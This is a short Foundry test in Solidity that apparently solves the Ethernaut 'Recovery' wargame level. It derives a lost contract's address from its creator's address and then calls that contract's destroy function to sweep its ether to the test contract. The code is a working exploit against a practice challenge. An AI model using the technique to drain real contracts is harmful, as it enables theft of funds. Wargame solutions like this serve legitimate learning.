// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Test.sol";
import "../Utils.sol";

contract RecoveryTest is Test {
  address internal challengeAddress;

  function setUp() public {
    challengeAddress = utils.createLevelInstance(0xb4B157C7c4b0921065Dded675dFe10759EecaA6D, 0.001 ether);
  }

  function testExploit() public {
    address lostAddress = address(
      uint160(
        uint256(
          keccak256(
            abi.encodePacked(
              uint8(0xd6), uint8(0x94), challengeAddress, uint8(0x01))))));

    (bool success,) = lostAddress.call(abi.encodeWithSignature("destroy(address)", address(this)));
    success;

    utils.submitLevelInstance(challengeAddress);
  }
}
